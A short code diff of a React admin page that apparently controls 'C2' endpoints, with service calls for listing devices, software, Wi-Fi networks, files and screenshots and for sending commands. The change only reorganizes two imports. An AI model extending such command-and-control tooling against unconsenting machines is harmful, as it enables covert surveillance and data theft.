@@ -2,7 +2,8 @@ import { PageContainer, ProCard } from '@ant-design/pro-components';
 import { useParams, useRequest } from '@umijs/max';
 import { Button, Card, Descriptions, message, Space, Tabs, Typography, Input, Table, Switch, Image, Badge, Alert, Select } from 'antd';
 import React, { useEffect, useState } from 'react';
-import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet, listFilesUsingGet, requestScanUsingPost } from '@/services/backend/c2DeviceController';
+import { listC2DeviceVoByPageUsingPost, listSoftwareUsingGet, listWifiUsingGet } from '@/services/backend/c2DeviceController';
+import { listFilesUsingGet, requestScanUsingPost } from '@/services/backend/c2FileController';
 import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
 import { listScreenshotsUsingGet } from '@/services/backend/c2Controller';
 import { ReloadOutlined, HistoryOutlined, PictureOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, SearchOutlined, ArrowUpOutlined, FolderOpenOutlined, FileOutlined, DesktopOutlined } from '@ant-design/icons';
@@ -144,8 +145,6 @@ const WifiTab = ({ uuid, onRefresh }: { uuid: string; onRefresh: () => void }) =
     );
 };
 
-
-import { requestScanUsingPost, listFilesUsingGet } from '@/services/backend/c2FileController';
 
 const FileTab = ({ uuid, onSendCommand }: { uuid: string; onSendCommand: (cmd: string, params?: string) => void }) => {
     const [fileList, setFileList] = useState<any[]>([]);
